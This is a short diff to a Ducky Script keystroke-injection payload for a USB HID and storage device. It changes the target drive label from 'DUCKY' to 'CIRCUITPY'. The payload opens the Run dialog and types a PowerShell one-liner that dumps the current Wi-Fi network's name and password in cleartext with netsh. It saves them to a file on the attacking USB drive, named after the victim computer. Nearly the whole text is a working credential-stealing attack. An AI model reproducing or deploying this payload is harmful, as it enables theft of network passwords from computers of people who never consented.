@@ -3,7 +3,7 @@ ATTACKMODE HID STORAGE
 DELAY 2000
 GUI r
 DELAY 100
-STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\'$env:computername'.txt'"
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter;netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\'$env:computername'.txt'"
 ENTER
 
 
